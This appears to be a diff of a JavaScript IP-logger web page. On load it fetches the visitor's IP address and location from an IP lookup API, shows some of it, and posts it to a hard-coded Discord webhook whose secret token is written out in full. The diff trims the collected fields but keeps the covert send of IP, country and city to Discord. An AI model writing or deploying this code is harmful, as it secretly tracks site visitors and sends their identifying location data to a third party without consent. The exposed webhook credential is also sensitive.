@@ -1,32 +1,24 @@
 // Discord webhook URL
 const webhookURL = "https://discord.com/api/webhooks/1348973855217156116/Y_wUbOXZn0U769LrIiPAFSE7VszYA1Kjc3y_35KnOXXKxn6EsA-ggbDVlunb8GLhh6kd";
 
-// Function to fetch the user's IP address, location data, ISP, and User-Agent
+// Function to fetch the user's IP address and location data
 async function fetchIPData() {
   try {
-    const response = await fetch("https://ipapi.co/json/");
+    const response = await fetch("https://ipwhois.app/json/");
     const data = await response.json();
     return {
       ip: data.ip,
-      country: data.country_name,
+      country: data.country,
       countryCode: data.country_code,
-      city: data.city,
-      isp: data.org || "Unknown ISP",
-      latitude: data.latitude,
-      longitude: data.longitude,
-      userAgent: navigator.userAgent // Get User-Agent
+      city: data.city // Fetching city from the response
     };
   } catch (error) {
     console.error("Error fetching IP data:", error);
     return {
       ip: "Unknown",
       country: "Unknown",
-      countryCode: "XX",
-      city: "Unknown",
-      isp: "Unknown",
-      latitude: "Unknown",
-      longitude: "Unknown",
-      userAgent: "Unknown"
+      countryCode: "XX", // Default for unknown
+      city: "Unknown"
     };
   }
 }
@@ -37,11 +29,9 @@ function getCountryFlagEmoji(countryCode) {
 }
 
 // Function to send data to Discord webhook
-async function sendToDiscord(ip, country, city, flag, isp, latitude, longitude, userAgent) {
-  const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-  
+async function sendToDiscord(ip, country, city, flag) {
   const data = {
-    content: `**IP Address:** ${ip}\n**Country:** ${country} ${flag}\n**City:** ${city}\n**ISP:** ${isp}\n**Coordinates:** [${latitude}, ${longitude}](<${googleMapsLink}>)\n**User-Agent:** ${userAgent}`
+    content: `**IP Address:** ${ip}\n**Country:** ${country} ${flag}\n**City:** ${city}`,
   };
 
   try {
@@ -58,22 +48,18 @@ async function sendToDiscord(ip, country, city, flag, isp, latitude, longitude, 
   }
 }
 
-// Main function to fetch and display/send user data
+// Main function to fetch IP, country, city, flag, and display/send data
 async function main() {
-  const { ip, country, countryCode, city, isp, latitude, longitude, userAgent } = await fetchIPData();
+  const { ip, country, countryCode, city } = await fetchIPData();
   const flag = getCountryFlagEmoji(countryCode);
-  const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-  // Display the IP address, city, ISP, and flag on the webpage
+  // Display the IP address, city, and flag on the webpage
   document.getElementById("ip-address").textContent = ip;
   document.getElementById("country-flag").textContent = flag;
   document.getElementById("city").textContent = city;
-  document.getElementById("isp").textContent = isp;
-  document.getElementById("coordinates").textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-  document.getElementById("map-link").innerHTML = `<a href="${googleMapsLink}" target="_blank">View on Google Maps</a>`;
 
-  // Send all data to Discord
-  await sendToDiscord(ip, country, city, flag, isp, latitude, longitude, userAgent);
+  // Send IP, country, city, and flag to Discord
+  await sendToDiscord(ip, country, city, flag);
 }
 
 // Run the main function when the page loads
